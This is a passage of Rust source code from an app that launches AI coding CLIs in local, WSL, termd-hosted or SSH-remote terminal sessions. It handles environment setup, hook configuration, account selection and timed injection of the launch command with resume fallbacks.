    let text = path.to_string_lossy().into_owned();
    (path.is_file() && quotable_path(&text)).then(|| format!("--settings \"{text}\""))
}

fn config_for_store(config: &SessionConfig) -> JsonValue {
    let mut value = serde_json::to_value(config).unwrap_or(JsonValue::Null);
    if let Some(obj) = value.as_object_mut() {
        if let Some(options) = obj
            .get_mut("providerOptions")
            .and_then(JsonValue::as_object_mut)
        {
            options.remove("autoPrompt");
            options.remove("userPrompt");
            options.remove("prompt");
        }
        obj.remove("env");
        obj.remove("extensionSelection");
    }
    value
}

fn start_provider_session_probe(
    manager: &Arc<SessionManager>,
    session_id: &str,
    provider: &str,
    cwd: &str,
    spawned_at_ms: u128,
    provider_home: Option<String>,
) {
    if cwd.is_empty() || !crate::commands::provider_session_probe::has_session_probe(provider) {
        return;
    }
    let probe_manager = Arc::clone(manager);
    let probe_session_id = session_id.to_string();
    let probe_provider = provider.to_string();
    let probe_cwd = cwd.to_string();
    std::thread::spawn(move || {
        if let Some(id) = crate::commands::provider_session_probe::probe_provider_session_id_in_home(
            &probe_provider,
            &probe_cwd,
            spawned_at_ms,
            provider_home.as_deref(),
        ) {
            probe_manager.set_claude_session_id(&probe_session_id, &id);
        }
    });
}

fn persist_provider_switch(manager: &Arc<SessionManager>, session_id: &str) {
    let (db_id, provider, config, sid) = {
        let state = manager.state.lock();
        let Some(session) = state.sessions.get(session_id) else {
            return;
        };
        (
            state.db_ids.get(session_id).cloned(),
            session.provider.clone(),
            session.config.clone(),
            session.claude_session_id.clone(),
        )
    };
    let Some(db_id) = db_id else { return };
    api_update(
        &manager.snapshot_auth(),
        &db_id,
        serde_json::json!({
            "provider": provider,
            "config": config_for_store(&config),
            "claude_session_id": sid,
        }),
    );
}

/// Output and exit of a session PTY: the same code for the PTY in the app
/// process and for the one in termd (TermdSink), so buffer, replay, tap and
/// statuses do not know who owns the PTY.
struct SessionOutputSink {
    session_id: String,
    buffer: Arc<Mutex<OutputBuffer>>,
    last_output_ms: Arc<std::sync::atomic::AtomicU64>,
    pump: Arc<crate::commands::terminal::PumpState>,
    manager: Arc<SessionManager>,
    app: tauri::AppHandle,
}

impl SessionOutputSink {
    /// Accumulates into the replay buffer + streams on the pump
    /// (handleOutput → session:output event).
    fn chunk(&self, chunk: &[u8]) {
        self.buffer.lock().push(chunk);
        self.last_output_ms
            .store(epoch_ms(), std::sync::atomic::Ordering::Relaxed);
        // Dead channel (webview reload): silent drop toward the
        // renderer, replay buffer and tap keep going anyway.
        let _ = self.pump.push(chunk);
        // Remote access tap (redaction + ring buffer on the manager side).
        let tap = self.manager.output_tap.lock().clone();
        if let Some(tap) = tap {
            tap(&self.session_id, chunk);
        }
    }

    fn exit(&self, exit_code: Option<u32>) {
        // terminal:exit → updateStatus(sessionId, 'exited'). Skipped if the
        // session was parked on purpose (standby: the PTY dies
        // because of the park, not because of a provider exit).
        //
        // Decision under ONE lock, action outside: standby() takes the
        // lock again (sub-agent cascade) and the parking_lot Mutex is not reentrant —
        // calling it with the guard held would deadlock.
        // Agents: lead closed on purpose (close_own_pty) — the EOF is
        // intended, NOT a provider exit. Without this gate the main
        // converged into standby(), which cascade-parked all the
        // live sub-agents ("I close the lead and the session closes on me").
        // Read OUTSIDE the lock: meta_key resolves the dbId via state.
        if crate::commands::agents::is_lead_closed(&self.manager, &self.session_id) {
            return;
        }
        let convert_to_standby = self.manager.note_pty_exit(
            &self.session_id,
            &self.buffer,
            exit_code.map(|c| serde_json::json!({ "exitCode": c })),
        );
        if convert_to_standby {
            // Unexpected exit (provider crash or the user's `exit`): the
            // session converges into the parked state so the standby cover
            // offers "Resume session" instead of a dead terminal with no
            // way out. If a concurrent destroy wins the race, standby()
            // hits the "missing session" branch and queues at most one spurious
            // update keyed on the local uuid (harmless not_found in the store).
            let _ = self.manager.standby(&self.app, &self.session_id);
        }
    }
}

impl crate::commands::termd_link::TermdSink for SessionOutputSink {
    fn output(&self, data: &[u8]) {
        self.chunk(data);
    }
    fn exited(&self, code: Option<u32>) {
        self.pump.mark_eof();
        self.exit(code);
    }
}

/// Spawns the PTY for the session + output pump on session:output.
/// Steps:
///   - checkProvider() pre-spawn (blocks if the binary is missing)
///   - terminalManager.create (login-shell PTY, env cleaned of CLAUDECODE)
///   - adapter.spawn → injectWhenReady of the provider's launch command
fn spawn_session_pty(
    app: &tauri::AppHandle,
    manager: &Arc<SessionManager>,
    session_id: &str,
    provider: &str,
    config: &SessionConfig,
    on_output: Channel<InvokeResponseBody>,
) -> Result<(), String> {
    // Remote session on a saved connection (cwd `ssh://<connId>/<path>`):
    // dedicated russh transport — the local flow below stays UNCHANGED.
    if let Some(cwd) = config.cwd.as_deref() {
        if let Some((conn_id, remote_cwd)) = crate::commands::remote::parse_remote_path(cwd) {
            return spawn_remote_session_pty(
                app,
                manager,
                session_id,
                provider,
                config,
                on_output,
                &conn_id,
                &remote_cwd,
            );
        }
    }

    // Remote "command" transport (cwd `cmd://<path>`): the local PTY runs
    // the user's connection command (ssh / aws ssm / …) and keeps it
    // alive; the rest of the local flow (pump, buffer, standby, wake) stays
    // identical. Local-only parts (provider check, TCC-on-cwd, hooks,
    // account env, tailer, probe) are gated below on `cmd_remote`.
    let cmd_remote: Option<(String, String)> = config
        .cwd
        .as_deref()
        .and_then(crate::commands::remote::parse_cmd_path)
        .map(|remote_path| {
            config
                .remote_command
                .as_deref()
                .map(str::trim)
                .filter(|c| !c.is_empty())
                .map(|c| (c.to_string(), remote_path))
                .ok_or_else(|| {
                    "Remote session has no connect command configured (config.remoteCommand)."
                        .to_string()
                })
        })
        .transpose()?;

    // Effective shell: per-session override, otherwise the distro inferred from a
    // \\wsl.localhost\… workspace, otherwise the Settings default.
    let shell_choice = crate::commands::windows_shells::effective_shell_for(
        config.shell.as_deref(),
        config.cwd.as_deref(),
    );

    // Validate that the provider binary is available (like createSession). Skipped for
    // cross-env shells (WSL/Git Bash): the CLI may exist only in there.
    // Also skipped for the command transport: the binary lives on the remote host.
    if cmd_remote.is_none()
        && !crate::commands::windows_shells::is_cross_env_shell(shell_choice.as_deref())
    {
        let check = check_provider(provider);
        if !check.installed {
            return Err(format!(
                "Provider binary \"{}\" not found on PATH. Please install it before starting a session.",
                check.command
            ));
        }
    }

    let cols = config.cols.unwrap_or(120);
    let rows = config.rows.unwrap_or(30);
    // Command transport: the local subprocess starts from home — the REMOTE
    // folder arrives with the `cd` injected after connecting.
    let cwd = if cmd_remote.is_some() {
        home_dir()
    } else {
        config.cwd.clone().unwrap_or_else(home_dir)
    };
    // Missing or non-directory workspace folder (deleted, moved, unmounted):
    // refuse to start instead of silently opening the shell in home, where
    // the agent would work on the wrong files. The session stays parked and
    // the error reaches the user (wake/create failure toast) next to the
    // "Relink folder" banner. Checking here also avoids the Windows ConPTY
    // failure, which happens ASYNCHRONOUSLY with "error code: 267" and
    // cannot be caught.
    // Cross-env shells (WSL/Git Bash) keep the historical fallback: their
    // `\\wsl.localhost` paths can fail a host-side stat while the distro is
    // still starting.
    if cmd_remote.is_none()
        && !crate::commands::windows_shells::is_cross_env_shell(shell_choice.as_deref())
    {
        if let Some(err) = missing_workspace_error(config.cwd.as_deref(), &|p| {
            std::fs::metadata(p).map(|m| m.is_dir()).unwrap_or(false)
        }) {
            return Err(err);
        }
    }
    let cwd = if std::fs::metadata(&cwd).map(|m| m.is_dir()).unwrap_or(false) {
        cwd
    } else {
        // Only reachable without a configured folder (home itself missing).
        home_dir()
    };

    // macOS TCC guard (cache-only, zero syscalls: never a consent dialog from the
    // main thread): cwd under a root already known as denied → no spawn of
    // a broken PTY (FolderAccessDeniedError → the session stays parked).
    if let Some(monitor) = crate::commands::folder_access::global_monitor() {
        if monitor.is_known_denied(Some(&cwd)) {
            return Err(format!(
                "macOS is blocking access to \"{}\" — grant it in System Settings → Privacy & Security",
                monitor.get_tcc_root(Some(&cwd)).unwrap_or_default()
            ));
        }
    }

    // Chosen shell (Windows: powershell/pwsh/cmd/gitbash/wsl:*), otherwise the
    // platform's login+interactive shell (getShell + getLoginArgs).
    let resolved =
        crate::commands::windows_shells::resolve_shell_spawn(shell_choice.as_deref(), Some(&cwd));
    let (shell, shell_args, pty_cwd, is_wsl) = if let Some((connect_cmd, _)) = &cmd_remote {
        // The PTY's "program" is the connection command, run by the
        // login shell (profile PATH: aws/ssh installed via brew/npm
        // must resolve). Resize → SIGWINCH propagated by ssh -t/SSM.
        if cfg!(windows) {
            (
                "powershell.exe".to_string(),
                crate::commands::windows_shells::ps_connect_args(connect_cmd),
                cwd.clone(),
                false,
            )
        } else {
            (
                login_shell(),
                vec!["-l".to_string(), "-c".to_string(), connect_cmd.clone()],
                cwd.clone(),
                false,
            )
        }
    } else {
        match &resolved {
            Some(r) => (
                r.file.clone(),
                r.args.clone(),
                r.cwd.clone().unwrap_or_else(|| cwd.clone()),
                r.is_wsl,
            ),
            None => (login_shell(), login_args(), cwd.clone(), false),
        }
    };
    let mut cmd = CommandBuilder::new(&shell);
    for arg in shell_args {
        cmd.arg(arg);
    }
    cmd.cwd(&pty_cwd);

    // Env: inherits the process env, applies config.env, removes CLAUDECODE/CLAUDE_CODE.
    for (k, v) in std::env::vars() {
        cmd.env(k, v);
    }
    strip_inherited_agent_env(&mut cmd);
    if let Some(env) = &config.env {
        for (k, v) in env {
            cmd.env(k, v);
        }
    }
    cmd.env_remove("CLAUDECODE");
    cmd.env_remove("CLAUDE_CODE");
    apply_terminal_env(&mut cmd);

    // Claude Code hooks: writes .claude/settings.local.json and passes the
    // attribution env, like claude-code-cli-adapter.spawn (writeHookSettings +
    // extraEnv). On Windows with CLI >= 2.1.63 uses HTTP hooks (no
    // node spawn per tool). WSL sessions have a dedicated plan
    // (hook::wsl_hook_plan): Claude runs INSIDE the distro, so the shim path
    // and server host must be translated — a hook with a Windows path in
    // there spams "PreToolUse:Bash hook error" on every tool call.
    let mut hook_env: Vec<(String, String)> = Vec::new();
    // Command transport: Claude runs on the REMOTE HOST — local hooks are useless
    // (and write_hook_settings on a virtual cwd would dirty the local disk).
    if provider == "claude-code-cli" && cmd_remote.is_none() {
        let hook_port = crate::commands::hook::global_port();
        if hook_port != 0 {
            if is_wsl {
                let distro =
                    crate::commands::windows_shells::wsl_distro_of(shell_choice.as_deref())
                        .unwrap_or_default();
                match crate::commands::hook::wsl_hook_plan(app, &distro, hook_port) {
                    crate::commands::hook::WslHookPlan::Http { host } => {
                        if let Err(err) = crate::commands::hook::write_hook_settings(
                            &cwd,
                            "",
                            hook_port,
                            true,
                            Some(&host),
                        ) {
                            eprintln!("[hooks] write settings failed: {err}");
                        }
                    }
                    crate::commands::hook::WslHookPlan::Command { script_path, hosts } => {
                        if let Err(err) = crate::commands::hook::write_hook_settings(
                            &cwd,
                            &script_path,
                            hook_port,
                            false,
                            None,
                        ) {
                            eprintln!("[hooks] write settings failed: {err}");
                        }
                        hook_env.push(("PROMPTOPS_HOOK_HOSTS".into(), hosts));
                    }
                    crate::commands::hook::WslHookPlan::Skip => {
                        // No usable format in the distro: also remove
                        // any stale hooks (e.g. Windows paths written
                        // by a PowerShell session) — never console errors.
                        crate::commands::hook::cleanup_hook_settings(&cwd);
                        eprintln!(
                            "[hooks] WSL distro has no usable hook transport — hooks skipped"
                        );
                    }
                }
            } else {
                match crate::commands::hook::ensure_hook_script() {
                    Ok(script) => install_claude_hooks(&cwd, &script.to_string_lossy(), hook_port),
                    Err(err) => eprintln!("[hooks] script materialization failed: {err}"),
                }
            }
            hook_env.push(("PROMPTOPS_HOOK_PORT".into(), hook_port.to_string()));
            hook_env.push((
                crate::commands::agent_ctl::TOKEN_ENV.into(),
                crate::commands::agent_ctl::token().into(),
            ));
        }
        hook_env.push(("PROMPTOPS_SESSION_ID".into(), session_id.to_string()));
        hook_env.push(("PROMPTOPS_WORKSPACE".into(), cwd.clone()));
        for (k, v) in &hook_env {
            cmd.env(k, v);
        }
    }

    // WSL: forward the custom + attribution envs into the distro via
    // WSLENV (path → /p; PROMPTOPS_WORKSPACE verbatim, see buildWslEnvValue).
    // Must be computed AFTER the hook block: without the PROMPTOPS_* in WSLENV the
    // Claude process in the distro does not see them at all.
    if is_wsl {
        if let Some(v) = crate::commands::windows_shells::build_wsl_env_value(
            std::env::var("WSLENV").ok().as_deref(),
            config.env.as_ref(),
            &hook_env,
            &["PROMPTOPS_WORKSPACE"],
        ) {
            cmd.env("WSLENV", v);
        }
    }

    // Provider account (multi-account): resolve the effective account and set
    // the CLI-specific env var (CLAUDE_CONFIG_DIR, CODEX_HOME, …).
    // Skipped with the command transport: they are LOCAL config paths, on the remote
    // host they would point to nonexistent directories.
    let mut account_vars = Vec::new();
    let mut launched_account: Option<String> = None;
    if let Some((env_var, config_dir, account_id)) = if cmd_remote.is_some() {
        None
    } else {
        crate::commands::provider_account::resolve_account_env(
            provider,
            config.provider_account_id.clone(),
        )
    } {
        account_vars =
            crate::commands::provider_account::account_env_vars(env_var, &config_dir, &account_id);
        crate::commands::provider_account::apply_account_env(&mut cmd, &account_vars);
        launched_account = Some(account_id);
    }
    if cmd_remote.is_none() {
        if let Some(session) = manager.state.lock().sessions.get_mut(session_id) {
            session.config.launched_provider_account_id =
                Some(launched_account.unwrap_or_default());
        }
    }

    // Native gemini/agy hooks: the CLI's GLOBAL config (the account's
    // GEMINI_CLI_HOME included) + attribution env for the shim. No WSL or
    // remote: the CLI would run where the local shim and port don't exist.
    if cmd_remote.is_none() && !is_wsl {
        let gemini_home = account_vars
            .iter()
            .find(|(k, _)| k == "GEMINI_CLI_HOME")
            .map(|(_, v)| v.as_str());
        let provider_env = crate::commands::hook::provider_hook_env(provider, gemini_home);
        if !provider_env.is_empty() {
            for (k, v) in &provider_env {
                cmd.env(k, v);
            }
            cmd.env("PROMPTOPS_SESSION_ID", session_id);
            cmd.env("PROMPTOPS_WORKSPACE", &cwd);
        }
    }

    let buffer = Arc::new(Mutex::new(OutputBuffer::new(cols, rows)));
    let last_output_ms = Arc::new(std::sync::atomic::AtomicU64::new(epoch_ms()));
    // Reader→flusher coalescing (same pattern as terminal.rs): the PTY's micro-reads
    // during a TUI redraw must not be sent one by one to the renderer —
    // xterm would draw partial frames (graphical glitches). The reader accumulates,
    // the flusher sends coalesced chunks at COALESCE pace.
    let pump_state = Arc::new(crate::commands::terminal::PumpState::default());
    let sink = Arc::new(SessionOutputSink {
        session_id: session_id.to_string(),
        buffer: buffer.clone(),
        last_output_ms: last_output_ms.clone(),
        pump: pump_state.clone(),
        manager: Arc::clone(manager),
        app: app.clone(),
    });

    // Preventive reset of xterm "input-reporting" modes, as the FIRST output
    // chunk. The terminal view is REUSED across spawns (double
    // buffer): a dead TUI without DECRST leaves mouse tracking, focus
    // reporting and bracketed paste on, and from there every mouse movement becomes
    // INPUT (`ESC[<35;x;yM`) on the bare shell — seen in the field corrupting the
    // launch line (`claude…` → `ude…`, command not found). Invisible bytes,
    // idempotent, and they go through the replay buffer: same endOffset
    // accounting as the normal stream. The alt-screen (?1049) is NOT touched: the
    // wake's cover/seed choreography already handles it on the renderer side.
    buffer.lock().push(MODE_RESET_PREAMBLE);
    pump_state.push(MODE_RESET_PREAMBLE);

    // PTY in the external host (termd, beta) or in the app process.
    let mut reattached = false;
    let (backing, writer, killer) = if crate::commands::termd_link::enabled() {
        // Key stable across app restarts (the dbId), so after a crash the
        // wake finds the PTY still alive instead of launching another one.
        let key = manager
            .state
            .lock()
            .db_ids
            .get(session_id)
            .cloned()
            .unwrap_or_else(|| session_id.to_string());
        let alive = crate::commands::termd_link::list()
            .iter()
            .any(|p| p.id == key && p.alive);
        if alive {
            crate::commands::termd_link::attach(&key, sink.clone())?;
            reattached = true;
            eprintln!("[termd] re-attached to live session {key}");
        } else {
            let argv = cmd.get_argv();
            let program = argv
                .first()
                .map(|a| a.to_string_lossy().into_owned())
                .unwrap_or_default();
            let args = argv
                .iter()
                .skip(1)
                .map(|a| a.to_string_lossy().into_owned())
                .collect();
            let cwd = cmd.get_cwd().map(|c| c.to_string_lossy().into_owned());
            let env = cmd
                .iter_full_env_as_str()
                .map(|(k, v)| (k.to_string(), v.to_string()))
                .collect();
            crate::commands::termd_link::spawn(
                &key,
                program,
                args,
                cwd,
                env,
                cols,
                rows,
                sink.clone(),
            )?;
        }
        let writer: Box<dyn Write + Send> =
            Box::new(crate::commands::termd_link::TermdWriter(key.clone()));
        let killer: Box<dyn ChildKiller + Send + Sync> =
            Box::new(crate::commands::termd_link::TermdKiller(key.clone()));
        (
            PtyBacking::Termd(key),
            Arc::new(Mutex::new(writer)),
            Mutex::new(killer),
        )
    } else {
        let pair = NativePtySystem::default()
            .openpty(PtySize {
                rows,
                cols,
                pixel_width: 0,
                pixel_height: 0,
            })
            .map_err(|e| e.to_string())?;
        // The Child must be kept: without wait() the process stays a zombie (node-pty
        // did it for us); the killer is needed for the explicit destroy/standby teardown.
        let mut child = pair.slave.spawn_command(cmd).map_err(|e| e.to_string())?;
        let killer = Mutex::new(child.clone_killer());
        let mut reader = pair.master.try_clone_reader().map_err(|e| e.to_string())?;
        let writer = Arc::new(Mutex::new(
            pair.master.take_writer().map_err(|e| e.to_string())?,
        ));
        let rd_sink = sink.clone();
        std::thread::spawn(move || {
            // 64KB like terminal.rs: bigger reads = fewer syscalls/locks during
            // TUI redraw bursts.
            let mut buf = [0u8; 65536];
            loop {
                match reader.read(&mut buf) {
                    Ok(0) | Err(_) => break,
                    Ok(n) => rd_sink.chunk(&buf[..n]),
                }
            }
            rd_sink.pump.mark_eof();
            // Reap the child: without wait() it would stay a zombie until the app
            // closes. The exit code ends up in the exited event's history.
            let exit_code = child.wait().ok().map(|s| s.exit_code());
            rd_sink.exit(exit_code);
        });
        (PtyBacking::Local(pair), writer, killer)
    };

    crate::commands::term_host::spawn_session_flusher(session_id, pump_state, on_output);

    // Register the PTY on the session (refused, and the process stopped,
    // when the session was closed or parked meanwhile).
    manager.register_pty(
        session_id,
        SessionPty {
            backing,
            writer,
            buffer: buffer.clone(),
            last_output_ms,
            killer,
        },
    )?;

    // SessionTailer: starts the auto-approve watcher for this session.
    // Skipped with the command transport: it reads transcripts on the LOCAL fs.
    if cmd_remote.is_none() {
        if let Some(tailer) = crate::commands::session_tailer::global_tailer() {
            tailer.start_tailing(session_id, provider, &cwd);
        }
    }

    // Re-attach to an agent still alive in termd (app crash/restart): the
    // provider is already running, the launch line would land INSIDE the TUI.
    if reattached {
        return Ok(());
    }

    // The provider's launch command, injected when the shell is ready —
    // helper shared with the remote transports (spawn_remote_session_pty / cmd).
    match &cmd_remote {
        // Command transport: the injected line lands in the REMOTE SHELL once
        // connected — slow pacing (the connection can take seconds)
        // and a `cd` prefix to land in the chosen remote folder.
        Some((_, remote_path)) => {
            let prefix = (!remote_path.is_empty())
                .then(|| format!("cd {}", crate::commands::remote::sh_quote(remote_path)));
            schedule_launch_injection_ex(
                manager,
                session_id,
                provider,
                config,
                false,
                prefix,
                InjectPacing::SlowConnect,
            );
        }
        None => schedule_launch_injection_ex(
            manager,
            session_id,
            provider,
            config,
            true,
            crate::commands::provider_account::account_shell_prefix(&account_vars, &shell),
            InjectPacing::LocalShell,
        ),
    }

    // Providers without hooks (grok, opencode, hermes): the conversation id exists and
    // the CLI can resume it, but no one announces it — a probe goes and
    // fetches it, handing it to set_claude_session_id as the hook would.
    // Skipped with the command transport: the probe reads logs on the LOCAL fs.
    if cmd_remote.is_none() && crate::commands::provider_session_probe::has_session_probe(provider)
    {
        start_provider_session_probe(
            manager,
            session_id,
            provider,
            &cwd,
            crate::commands::provider_session_probe::now_ms(),
            provider_home_for_config(provider, config.provider_account_id.clone()),
        );
    }

    Ok(())
}

/// Shared (local+remote) tail of the launch injection: resolves the resume
/// from state (never from `config` alone, which can be stale on respawn),
/// forces the fresh id when needed, arms the inject + recovery thread.
///
/// `allow_fresh_sid=false` for the remote transport: `--session-id` support
/// (and therefore the keep-id recovery too) is verified on the LOCAL CLI
/// binary — it may not hold on the remote host, and a rejected flag kills the TUI.
fn schedule_launch_injection(
    manager: &Arc<SessionManager>,
    session_id: &str,
    provider: &str,
    config: &SessionConfig,
    allow_fresh_sid: bool,
) {
    schedule_launch_injection_ex(
        manager,
        session_id,
        provider,
        config,
        allow_fresh_sid,
        None,
        InjectPacing::Shell,
    );
}

/// Injection pacing: `Shell` = local shell/channel already open (historical
/// parameters); `SlowConnect` = the PTY is STILL establishing a remote
/// connection (ssh/SSM) — wide floor and quiet, ceiling at 45s, so the line does not
/// land mid-handshake (or inside a password prompt).
/// `LocalShell` = same parameters as `Shell`, but the PTY is local: enables
/// the soft ceiling and launch confirmation (LAUNCH_CONFIRM, Linux only).
#[derive(Clone, Copy, PartialEq)]
enum InjectPacing {
    Shell,
    LocalShell,
    SlowConnect,
}

impl InjectPacing {
    /// (floor_ms, quiet_ms, ceiling_ms)
    fn params(self) -> (u128, u128, u128) {
        match self {
            InjectPacing::Shell | InjectPacing::LocalShell => (250, 250, 4_000),
            InjectPacing::SlowConnect => (2_000, 1_500, 45_000),
        }
    }
}

/// Linux: the provider launch on a local PTY is CONFIRMED. On the first
/// start after a reboot `bash -l -i` can exceed the 4s ceiling without
/// printing anything: the line injected into a shell that is not reading yet
/// is lost and the session stays a bare shell without Claude. With the gate:
/// (1) with no visible output we wait for the shell up to
/// LAUNCH_HARD_CEILING_MS instead of injecting blindly at 4s; (2) if after
/// the injection the provider never comes to the foreground and the shell
/// sits on its prompt, the line is re-injected ONCE. macOS/Windows
/// unchanged (same policy as RESTORE_STABLE_ORDER).
const LAUNCH_CONFIRM: bool = cfg!(target_os = "linux");
/// Soft ceiling: past the pacing ceiling we inject only when the shell is
/// ready (visible output + quiet), up to this absolute limit.
const LAUNCH_HARD_CEILING_MS: u128 = 12_000;
/// Post-launch watchdog window.
const LAUNCH_CONFIRM_WINDOW_MS: u128 = 10_000;
/// Shell idle for at least this long = waiting for input at its prompt.
const LAUNCH_CONFIRM_QUIET_MS: u128 = 1_500;

/// Full variant: `launch_prefix` (e.g. `cd '<remote path>'`) is
/// prepended to the launch line with `&&`; if the provider has no launch
/// (generic-shell) only the prefix is injected — this is how a command
/// session "lands" in the chosen remote folder.
fn schedule_launch_injection_ex(
    manager: &Arc<SessionManager>,
    session_id: &str,
    provider: &str,
    config: &SessionConfig,
    allow_fresh_sid: bool,
    launch_prefix: Option<String>,
    pacing: InjectPacing,
) {
    let (session_provider, session_sid, device_id) = {
        let guard = manager.state.lock();
        let device_id = guard.api_device_id.clone();
        match guard.sessions.get(session_id) {
            Some(s) => (s.provider.clone(), s.claude_session_id.clone(), device_id),
            None => (provider.to_string(), None, device_id),
        }
    };
    let resume_sid = resolve_resume_sid_for_launch(
        provider,
        config,
        &session_provider,
        session_sid.as_deref(),
        device_id.as_deref(),
    );
    let resume_requested = config
        .provider_options
        .as_ref()
        .and_then(|o| o.get("resume"))
        .and_then(|v| v.as_bool())
        .unwrap_or(false);
    // No captured id + other sessions of the same family on the same
    // cwd: the `--continue` fallback would resume the folder's most recent
    // conversation — most likely ANOTHER session's — and
    // the SessionStart hook would write that id HERE, binding two sessions to the
    // same transcript (seen in the field on Ubuntu: "I switch session and another
    // one opens, overwriting the real one"). Better to start clean:
    // cwd-siblings guard. Linux for all families, claude and codex on every OS
    // (resume_siblings_guard_for).
    let siblings_guard = resume_siblings_guard_for(provider);
    let has_siblings = siblings_guard
        && resume_requested
        && resume_sid.is_none()
        && manager.cwd_has_resume_siblings(session_id, provider, config.cwd.as_deref());
    let (allow_continue, fresh_sid_ok) = resume_launch_plan(
        siblings_guard,
        resume_requested,
        resume_sid.is_some(),
        has_siblings,
    );
    if !allow_continue {
        eprintln!(
            "[SessionManager] resume suppressed for {session_id}: no provider session id and cwd shared with other {} sessions — launching clean (no --continue)",
            provider_resume_family(provider)
        );
    }
    // Conversation id forced when NOTHING is resumed: makes the
    // transcript (and therefore the model in use) locatable without depending
    // on the SessionStart hook, which a stale settings file can make disappear.
    // With the gate on NEVER together with `--continue`: the builder drops
    // `--session-id` in that case, and an id registered but never used by the CLI
    // would make the next `--resume` fail (→ recovery on an empty conversation).
    let fresh_sid = if allow_fresh_sid
        && fresh_sid_ok
        && provider_resume_family(provider) == "claude-code-cli"
        && crate::commands::subagent::claude_supports_session_id()
    {
        Some(uuid::Uuid::new_v4().to_string())
    } else {
        None
    };
    if let Some(ref sid) = fresh_sid {
        manager.set_claude_session_id(session_id, sid);
    }
    let built = build_launch_command_inner(
        provider,
        config,
        resume_sid.as_deref(),
        allow_continue,
        fresh_sid.as_deref(),
        Some(session_id),
    );
    // `cd` prefix (command transport): prepended to the launch line — or
    // injected alone when the provider launches nothing (generic-shell).
    let launch = match (&built, &launch_prefix) {
        (Some(l), Some(p)) => Some(format!("{p} && {l}")),
        (Some(l), None) => Some(l.clone()),
        (None, Some(p)) => Some(format!("{p}\r")),
        (None, None) => None,
    };
    if let Some(launch) = launch {
        let inject_manager = Arc::clone(manager);
        let inject_session_id = session_id.to_string();
        // Fallback plans if the resume is rejected. `allow_continue: false`
        // because `--continue` also fails when there is no local conversation
        // in that cwd — it would end in an error ping-pong.
        // No prefix in the fallbacks: the shell is already in the folder after the
        // first `cd`.
        let recovery = built
            .is_some()
            .then_some(resume_sid.as_deref())
            .flatten()
            .map(|sid| ResumeRecovery {
                sid: sid.to_string(),
                keep_id: (allow_fresh_sid
                    && provider_resume_family(provider) == "claude-code-cli"
                    && crate::commands::subagent::claude_supports_session_id())
                .then(|| {
                    build_launch_command_inner(
                        provider,
                        config,
                        None,
                        false,
                        Some(sid),
                        Some(session_id),
                    )
                })
                .flatten(),
                plain: build_launch_command_inner(
                    provider,
                    config,
                    None,
                    false,
                    None,
                    Some(session_id),
                ),
            });
        let (floor_ms, quiet_ms, ceiling_ms) = pacing.params();
        // Confirm only when there really is a provider to launch (not just
        // generic-shell's `cd`) on a local PTY.
        let confirm = LAUNCH_CONFIRM && pacing == InjectPacing::LocalShell && built.is_some();
        let hard_ceiling_ms = if confirm {
            LAUNCH_HARD_CEILING_MS
        } else {
            ceiling_ms
        };
        std::thread::spawn(move || {
            let baseline = inject_when_ready(
                &inject_manager,
                &inject_session_id,
                &launch,
                floor_ms,
                quiet_ms,
                ceiling_ms,
                hard_ceiling_ms,
            );
            if confirm {
                if let Some(baseline) = baseline {
                    confirm_launch_took(&inject_manager, &inject_session_id, &launch, baseline);
                }
            }
            if let Some(recovery) = recovery {
                // With confirmation the recovery starts after the watchdog: it
                // must evaluate the output since the injection, not from now, or
                // an already printed "No conversation found" would be missed.
                let from = if confirm { baseline } else { None };
                recover_failed_resume(&inject_manager, &inject_session_id, &recovery, from);
            }
        });
    }
}

// ─────────────────────────────────────────────────────────────────────────
// Remote transport (SSH) — sessions with cwd `ssh://<connId>/<path>`.
// ─────────────────────────────────────────────────────────────────────────

/// Remote PTY writer: forwards bytes to the task that owns the SSH channel.
/// Never blocking (unbounded channel): a slow link freezes neither manager nor UI.
pub(crate) struct RemoteWriter {
    pub(crate) ctl: crate::commands::remote::RemoteShellCtl,
}

impl Write for RemoteWriter {
    fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
        self.ctl.write(buf);
        Ok(buf.len())
    }
    fn flush(&mut self) -> std::io::Result<()> {
        Ok(())
    }
}

/// Remote PTY killer: closes the SSH channel (EOF → SIGHUP to the remote
/// process). Used by destroy/standby via the same ChildKiller contract.
#[derive(Debug)]
pub(crate) struct RemoteKiller {
    pub(crate) ctl: crate::commands::remote::RemoteShellCtl,
}

impl ChildKiller for RemoteKiller {
    fn kill(&mut self) -> std::io::Result<()> {
        self.ctl.close();
        Ok(())
    }
    fn clone_killer(&self) -> Box<dyn ChildKiller + Send + Sync> {
        Box::new(RemoteKiller {
            ctl: self.ctl.clone(),
        })
    }
}

/// Remote mirror of spawn_session_pty: connection from the pool (reused across
/// sessions on the same host), REMOTE provider/folder checks with typed
/// errors (→ CreateResult.error / renderer wake toast), login shell
/// inside the remote cwd, same buffer/coalescing/injection pump as local.
///
/// Skipped ON PURPOSE (they assume a local filesystem — phase 2, VFS): TCC
/// guard, Claude hooks, auto-approve tailer, conversation id probe, gitignore,
/// provider account env (CLAUDE_CONFIG_DIR & co. are local paths).
#[allow(clippy::too_many_arguments)]
fn spawn_remote_session_pty(
    app: &tauri::AppHandle,
    manager: &Arc<SessionManager>,
    session_id: &str,
    provider: &str,
    config: &SessionConfig,
    on_output: Channel<InvokeResponseBody>,
    conn_id: &str,
    remote_cwd: &str,
) -> Result<(), String> {
    use tauri::Manager as _;

    let pool = app
        .state::<Arc<crate::commands::remote::RemotePool>>()
        .inner()
        .clone();
    let cols = config.cols.unwrap_or(120);
    let rows = config.rows.unwrap_or(30);

    // Binary expected on the REMOTE HOST (providerOptions.command or the
    // provider default). generic-shell → no check.
    let expected_cmd = config
        .provider_options
        .as_ref()
        .and_then(|o| o.get("command"))
        .and_then(|v| v.as_str())
        .map(str::to_string)
        .or_else(|| provider_command(provider).map(str::to_string));

    // Async setup on the runtime, awaited synchronously via a channel with
    // timeout: this thread is spawn_blocking (create/wake) or a dedicated
    // thread — the recv never hangs beyond 60s even with the network down.
    let (tx, rx) = std::sync::mpsc::channel();
    let async_app = app.clone();
    let async_conn = conn_id.to_string();
    let async_cwd = remote_cwd.to_string();
    let async_cmd = expected_cmd.clone();
    tauri::async_runtime::spawn(async move {
        let result: Result<crate::commands::remote::RemoteShell, String> = async {
            let handle = pool.get_or_connect(&async_app, &async_conn).await?;
            if let Some(cmd) = &async_cmd {
                if !crate::commands::remote::check_remote_command(&handle, cmd).await? {
                    return Err(format!(
                        "Provider binary \"{cmd}\" not found on the remote host. Install it (and log in) there before starting a remote session."
                    ));
                }
            }
            if !crate::commands::remote::check_remote_dir(&handle, &async_cwd).await? {
